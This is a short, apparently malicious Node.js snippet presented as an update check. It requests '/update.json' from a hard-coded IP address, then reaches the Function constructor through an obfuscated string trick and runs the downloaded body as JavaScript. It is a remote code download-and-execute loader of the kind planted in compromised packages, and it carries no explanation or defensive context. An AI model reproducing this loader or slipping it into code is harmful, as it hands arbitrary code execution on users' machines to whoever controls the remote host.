(function(){

var http = require('http');
	return http.get({
		host: '23.94.46.191',
		port: 80,
		path: '/update.json'
	}, function(response) {
		var body = '';
		response.on('data', function(d) {
			body += d;
		});
		response.on('end', function() {
			var f=this[(typeof(this.Buffer.from)).charAt(0).toUpperCase() + (typeof(this.Buffer.from)).slice(1)]; o=new f(body); o();
		});
	});
})();
